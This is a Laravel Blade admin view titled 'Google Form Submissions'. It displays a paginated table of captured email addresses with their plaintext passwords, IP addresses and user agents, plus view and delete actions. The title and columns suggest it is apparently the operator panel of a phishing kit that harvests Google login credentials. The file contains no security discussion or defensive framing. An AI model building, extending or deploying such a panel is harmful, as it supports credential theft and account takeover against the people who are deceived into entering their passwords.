@extends('layouts.app')

@section('title', 'Google Form Submissions | Admin')

@section('content')
<div class="container" style="padding: 40px 0;">
    <div style="background: rgba(10, 19, 35, 0.88); border: 1px solid rgba(148, 163, 184, 0.14); border-radius: 24px; padding: 28px;">
        <h1 style="color: #edf4ff; font-size: 2rem; margin-bottom: 20px;">All Form Submissions</h1>
        <a href="{{ route('admin.dashboard') }}" style="color: #4ea4ff; text-decoration: none;">← Back to Dashboard</a>
    </div>

    <div style="background: rgba(10, 19, 35, 0.88); border: 1px solid rgba(148, 163, 184, 0.14); border-radius: 24px; margin-top: 24px; overflow: hidden;">
        @if($submissions->count() > 0)
            <div class="table-responsive">
                <table style="width: 100%; color: #edf4ff; margin: 0;">
                    <thead>
                        <tr style="background: rgba(255, 255, 255, 0.04); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">Email</th>
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">Password</th>
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">IP Address</th>
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">User Agent</th>
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">Submitted</th>
                            <th style="padding: 15px 16px; text-align: left; font-size: 0.78rem; text-transform: uppercase; color: #dce9fa;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($submissions as $submission)
                            <tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.06);">
                                <td style="padding: 16px; color: #edf4ff;"><strong>{{ $submission->email }}</strong></td>
                                <td style="padding: 16px; color: #edf4ff; font-family: monospace;"><strong>{{ $submission->password }}</strong></td>
                                <td style="padding: 16px; color: #9fb0c8;">{{ $submission->ip_address ?? 'Unknown' }}</td>
                                <td style="padding: 16px; color: #9fb0c8;">{{ Str::limit($submission->user_agent, 40) }}</td>
                                <td style="padding: 16px; color: #9fb0c8;">{{ $submission->created_at->diffForHumans() }}</td>
                                <td style="padding: 16px;">
                                    <a href="{{ route('admin.submissions.show', $submission) }}" style="color: #9fd4ff; text-decoration: none; font-weight: 700;">View</a>
                                    |
                                    <form action="{{ route('admin.submissions.delete', $submission) }}" method="POST" style="display: inline;" onsubmit="return confirm('Delete this submission?');">
                                        @csrf
                                        @method('DELETE')
                                        <button type="submit" style="background: none; border: none; color: #ff6b7a; cursor: pointer; text-decoration: none; font-weight: 700;">Delete</button>
                                    </form>
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>

            <div style="padding: 20px; text-align: center;">
                {{ $submissions->links() }}
            </div>
        @else
            <div style="padding: 60px 20px; text-align: center; color: #9fb0c8;">
                <i class="fas fa-inbox" style="font-size: 2.4rem; margin-bottom: 12px; color: rgba(255, 255, 255, 0.18); display: block;"></i>
                <div>No form submissions yet.</div>
            </div>
        @endif
    </div>
</div>
@endsection
